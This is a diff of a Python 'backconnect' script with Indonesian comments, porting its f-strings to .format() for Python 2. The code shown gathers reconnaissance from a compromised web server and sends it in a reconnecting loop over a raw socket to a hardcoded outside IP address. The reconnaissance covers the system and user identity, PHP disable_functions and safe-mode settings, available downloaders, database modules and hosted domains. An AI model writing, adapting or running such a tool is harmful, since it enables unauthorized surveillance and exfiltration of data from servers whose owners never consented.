@@ -1,8 +1,11 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 import socket
 import subprocess
 import os
 import time
+import sys
 
 # Konfigurasi
 TARGET_IP = "103.125.43.187"  # Ganti dengan IP client Anda
@@ -75,7 +78,8 @@ def get_system_info():
         if len(lines) > 1:
             parts = lines[1].split()
             if len(parts) >= 4:
-                info['hdd'] = f"Total:{parts[1]} Free:{parts[3]} [{parts[4]}]"
+                # Ganti f-string dengan format() untuk kompatibilitas Python 2
+                info['hdd'] = "Total:{} Free:{} [{}]".format(parts[1], parts[3], parts[4])
             else:
                 info['hdd'] = "Unknown"
         else:
@@ -213,43 +217,50 @@ def send_info():
     output += "\033[1;32m========================================\033[0m\n\n"
     
     # Uname
-    output += f"\033[1;33mUname:\033[0m\t\033[1;37m{info['uname']}\033[0m\n"
+    output += "\033[1;33mUname:\033[0m\t\033[1;37m{}\033[0m\n".format(info['uname'])
     
     # User dan Group
-    output += f"\033[1;33mUser:\033[0m\t\033[1;37m{info['uid']} [ {info['user']} ] Group: {info['gid']} [ {info['group']} ]\033[0m\n"
+    output += "\033[1;33mUser:\033[0m\t\033[1;37m{} [ {} ] Group: {} [ {} ]\033[0m\n".format(
+        info['uid'], info['user'], info['gid'], info['group'])
     
     # PHP
-    output += f"\033[1;33mPHP:\033[0m\t\033[1;37m{info['php_version']} Safe Mode: {info['safe_mode']}\033[0m\n"
+    output += "\033[1;33mPHP:\033[0m\t\033[1;37m{} Safe Mode: {}\033[0m\n".format(
+        info['php_version'], info['safe_mode'])
     
     # IP
-    output += f"\033[1;33mServerIP:\033[0m\t\033[1;37m{info['server_ip']} Your IP: {TARGET_IP}\033[0m\n"
+    output += "\033[1;33mServerIP:\033[0m\t\033[1;37m{} Your IP: {}\033[0m\n".format(
+        info['server_ip'], TARGET_IP)
     
     # DateTime
-    output += f"\033[1;33mDateTime:\033[0m\t\033[1;37m{info['datetime']}\033[0m\n"
+    output += "\033[1;33mDateTime:\033[0m\t\033[1;37m{}\033[0m\n".format(info['datetime'])
     
     # Domains
-    output += f"\033[1;33mDomains:\033[0m\t\033[1;37m{info['domains']}\033[0m\n"
+    output += "\033[1;33mDomains:\033[0m\t\033[1;37m{}\033[0m\n".format(info['domains'])
     
     # HDD
-    output += f"\033[1;33mHDD:\033[0m\t\033[1;37m{info['hdd']}\033[0m\n"
+    output += "\033[1;33mHDD:\033[0m\t\033[1;37m{}\033[0m\n".format(info['hdd'])
     
     # Useful
-    output += f"\033[1;33mUseful :\033[0m\t\033[1;37m{info['useful']}\033[0m\n"
+    output += "\033[1;33mUseful :\033[0m\t\033[1;37m{}\033[0m\n".format(info['useful'])
     
     # Downloader
-    output += f"\033[1;33mDownloader:\033[0m\t\033[1;37m{info['downloader']}\033[0m\n"
+    output += "\033[1;33mDownloader:\033[0m\t\033[1;37m{}\033[0m\n".format(info['downloader'])
     
     # Disable Functions
-    output += f"\033[1;33mDisable Functions:\033[0m\t\033[1;37m{info['disable_functions']}\033[0m\n"
+    output += "\033[1;33mDisable Functions:\033[0m\t\033[1;37m{}\033[0m\n".format(info['disable_functions'])
     
     # PHP Modules
-    output += f"\033[1;33mCURL :\033[0m\t\033[1;37m{info['curl_status']} | SSH2 : {info['ssh2_status']} | Magic Quotes : {info['magic_quotes']} | MySQL : {info['mysql_status']} | MSSQL : {info['mssql_status']} | PostgreSQL : {info['pgsql_status']} | Oracle : {info['oracle_status']} | CGI : {info['cgi_status']}\033[0m\n"
+    output += "\033[1;33mCURL :\033[0m\t\033[1;37m{} | SSH2 : {} | Magic Quotes : {} | MySQL : {} | MSSQL : {} | PostgreSQL : {} | Oracle : {} | CGI : {}\033[0m\n".format(
+        info['curl_status'], info['ssh2_status'], info['magic_quotes'], 
+        info['mysql_status'], info['mssql_status'], info['pgsql_status'],
+        info['oracle_status'], info['cgi_status'])
     
     # Open_basedir, etc.
-    output += f"\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{info['open_basedir']} | Safe_mode_exec_dir : {info['safe_mode_exec_dir']} | Safe_mode_include_dir : {info['safe_mode_include_dir']}\033[0m\n"
+    output += "\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{} | Safe_mode_exec_dir : {} | Safe_mode_include_dir : {}\033[0m\n".format(
+        info['open_basedir'], info['safe_mode_exec_dir'], info['safe_mode_include_dir'])
     
     # Software
-    output += f"\033[1;33mSoftWare:\033[0m\t\033[1;37m{info['software']}\033[0m\n"
+    output += "\033[1;33mSoftWare:\033[0m\t\033[1;37m{}\033[0m\n".format(info['software'])
     
     output += "\n"
     output += "\033[1;32m========================================\033[0m\n"
@@ -260,7 +271,7 @@ def send_info():
 
 def backconnect():
     while True:
-        print(f"[*] Mencoba koneksi ke {TARGET_IP}:{TARGET_PORT}")
+        print("[*] Mencoba koneksi ke {}:{}".format(TARGET_IP, TARGET_PORT))
         
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -269,9 +280,9 @@ def backconnect():
             s.close()
             print("[*] Informasi terkirim!")
         except Exception as e:
-            print(f"[!] Koneksi gagal: {str(e)}")
+            print("[!] Koneksi gagal: {}".format(str(e)))
         
-        print(f"[!] Reconnect dalam {RECONNECT_INTERVAL} detik...")
+        print("[!] Reconnect dalam {} detik...".format(RECONNECT_INTERVAL))
         time.sleep(RECONNECT_INTERVAL)
 
 if __name__ == "__main__":
